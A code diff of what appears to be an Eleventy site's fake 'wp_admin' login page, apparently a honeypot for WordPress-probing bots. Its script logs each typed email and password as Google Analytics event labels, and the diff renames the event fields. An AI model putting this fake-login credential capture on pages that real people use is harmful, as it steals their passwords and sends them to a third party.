@@ -29,20 +29,20 @@ eleventyExcludeFromCollections: true
 </form>
 
 <script>
-  gtag('event', 'shown', {
-    event_category: 'wp_admin',
+  gtag('event', 'wp_admin', {
+    event_category: 'shown',
     event_label: location.pathname
   });
   const inpEmail = document.querySelector('#inpEmail');
   const inpPass = document.querySelector('#inpPassword');
   const but = document.querySelector('#butLogin');
   but.addEventListener('click', () => {
-    gtag('event', 'email', {
-      event_category: 'wp_admin',
+    gtag('event', 'wp_admin', {
+      event_category: 'email',
       event_label: inpEmail.value,
     });
-    gtag('event', 'password', {
-      event_category: 'wp_admin',
+    gtag('event', 'wp_admin', {
+      event_category: 'password',
       event_label: inpPassword.value,
     });
     const e = inpEmail.value;
